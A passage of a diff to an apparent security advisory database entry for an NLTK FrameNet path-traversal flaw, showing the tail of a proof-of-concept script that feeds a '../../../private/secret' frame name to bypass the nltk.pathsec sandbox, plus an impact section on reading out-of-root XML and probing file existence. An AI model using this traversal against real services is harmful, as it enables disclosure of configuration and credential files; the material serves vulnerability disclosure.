\u003croot\u003e/frame/ up to \u003cbase\u003e/private/secret.xml\n    evil = os.path.join(\"..\", \"..\", \"..\", \"private\", \"secret\")\n    print(f\"[*] calling   fn.frame({evil!r})\")\n\n    try:\n        f = fn.frame(evil)\n        definition = f[\"definition\"]\n        if \"SECRET-OUT-OF-ROOT-CONTENT\" in definition:\n            print(\"\\n  [VULN] out-of-root file was read and returned to caller\")\n            print(f\"         frame name : {evil}\")\n            print(f\"         frame ID   : {f['ID']}   name: {f['name']}\")\n            print(f\"         definition : {definition}\")\n            print(f\"\\n  -\u003e nltk.pathsec sandbox bypassed despite ENFORCE = {ps.ENFORCE}\")\n            verdict = \"VULNERABLE\"\n        else:\n            print(f\"\\n  [?] frame() returned but content unexpected: {definition!r}\")\n            verdict = \"INCONCLUSIVE\"\n    except FramenetError as e:\n        # Patched build (#3581): _reject_unsafe_path_component raises before open().\n        print(f\"\\n  [SAFE] FramenetError: {e}\")\n        print(\"         traversal rejected before any file was opened (patched)\")\n        verdict = \"NOT VULNERABLE\"\n    except Exception as e:\n        print(f\"\\n  [SAFE] {type(e).__name__}: {e}\")\n        verdict = \"NOT VULNERABLE\"\n\n    # Control: a plain absent name must fail as 'Unknown frame', NOT as a read.\n    print(\"\\n[CONTROL] benign absent name should be 'Unknown frame':\")\n    try:\n        fn.frame(\"Definitely_Not_A_Frame\")\n        print(\"  [?] unexpectedly succeeded\")\n    except Exception as e:\n        print(f\"  ok -\u003e {type(e).__name__}: {e}\")\n\n    print(\"\\n\" + \"=\" * 59)\n    print(f\" Result: {verdict}  (ENFORCE = {ps.ENFORCE})\")\n    print(\"=\" * 59)\n\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n\n### Impact\n- **Out-of-sandbox arbitrary XML read.** Any application that routes attacker-influenced input into `frame()` can be made to read XML files from directories outside the intended corpus root and have their parsed content returned. `frame()` is a primary public API designed to accept a caller-specified frame name, so this is a natural exposure for any service exposing FrameNet lookups to user input.\n- **Broad read primitive.** Only a fixed `.xml` extension is appended; the attacker controls both directory and basename, giving \"read any XML file the process can read.\" Full content disclosure requires frame-shaped XML; other files yield a distinguishable parse error that acts as a file-existence/readability oracle for arbitrary paths.\n- **Silent bypass of an advertised boundary.** NLTK's `SECURITY.md` presents the `nltk.pathsec` sandbox and `ENFORCE=True` as a hard boundary for web apps, multi-tenant pipelines, and CI/CD. Because `frame_by_name` builds the path itself and reads through a string-path `XMLCorpusView`, the containment guard is never called and `ENFORCE=True` does not block the read — silently, with no error or warning.\n- **Crafted-corpus reach.** Via `doc()` and the lexical-unit loader, a malicious FrameNet data directory drives the same traversal with no caller-supplied name.\n- **Sensitive targets.** Depending on deployment, readable out-of-root XML can include application configuration, data exports, and on-disk credentials stored as XML; the oracle behavior also allows filesystem mapping. Where `frame()` output is reflected to the requester, disclosure is direct and non-blind.",
               "id": "GHSA-xh95-f55m-82fw",
-              "modified": "2026-07-31T17:00:21.729863168Z",
+              "modified": "2026-08-06T15:11:52.598451868Z",
               "published": "2026-07-31T16:50:41Z",
               "references": [
                 {
@@ -14143,6 +14692,9 @@
                   "type": "PACKAGE",
                   "url": "https://github.com/nltk/nltk"
                 }
+              ],
+              "related": [
+                "CGA-vj5p-vwmm-7f6j"
               ],
               "schema_version": "1.7.5",
               "severity": [
